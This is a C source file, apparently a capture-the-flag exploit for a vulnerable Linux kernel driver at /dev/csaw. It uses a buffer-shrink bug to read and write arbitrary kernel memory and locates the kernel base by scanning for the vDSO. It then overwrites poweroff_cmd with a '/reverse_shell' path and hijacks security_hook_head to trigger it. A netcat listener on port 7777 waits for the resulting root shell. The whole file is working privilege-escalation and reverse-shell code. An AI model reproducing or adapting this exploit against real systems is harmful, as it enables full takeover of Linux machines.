#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/auxv.h>
#include "exp.h"


int get_gettimeofday_str_offset(){
    unsigned long vdso_addr = getauxval(AT_SYSINFO_EHDR);
    char * name = "gettimeofday";
    char* name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));
    if (name_addr < 0){
        puts("don't found vdso gettimeofday!");
        exit(-1);
    }
    return name_addr - vdso_addr;
}


void main() {
    fd  = open("/dev/csaw", O_RDWR);
    id = c_alloc(fd, 0x20);
    c_shrink(fd, id, 0x21);
    char buf[0x100];
    c_read(fd, id, buf, 0x100);

    uint64 security_hook_head_offset = 0xeb8118;
    uint64 poweroff_work_func_offset = 0x9c950;
    uint64 poweroff_cmd_offset       = 0xe4dfa0;

    uint64 gettimeofday_str_offset = get_gettimeofday_str_offset();

    uint64 address = 0;
    for (address = 0xffffffff80000000; address<0xffffffffffffefff; address+=0x1000){
        // printf("[-] address [0x%llx] buf [0x%llx]\n", address, buf);
        reada(address, buf, 0x1000);
        if (!strcmp(buf+gettimeofday_str_offset, "gettimeofday")){
            printf("[!] find vdso in kernel [0x%llx]\n", address);
            break;
        }
    }

    uint64 kernel_base = address & 0xffffffffff000000;
    printf("kernel_base [0x%llx]\n", kernel_base);

    uint64 poweroff_work_func = kernel_base + poweroff_work_func_offset;
    printf("poweroff_work_func [0x%llx]\n", poweroff_work_func);

    uint64 security_hook_head = kernel_base + security_hook_head_offset;
    printf("security_hook_head [0x%llx]\n", security_hook_head);

    uint64 poweroff_cmd = kernel_base + poweroff_cmd_offset;
    printf("poweroff_cmd [0x%llx]\n", poweroff_cmd);

    char * reverse_shell = "/reverse_shell\0";

    writea(poweroff_cmd, reverse_shell, strlen(reverse_shell));
    writea(security_hook_head, &poweroff_work_func, 8);

    if (fork() == 0){
        prctl(0, 0);
        exit(-1);
    } 

    system("nc -l -p 7777");

    exit(0);
}
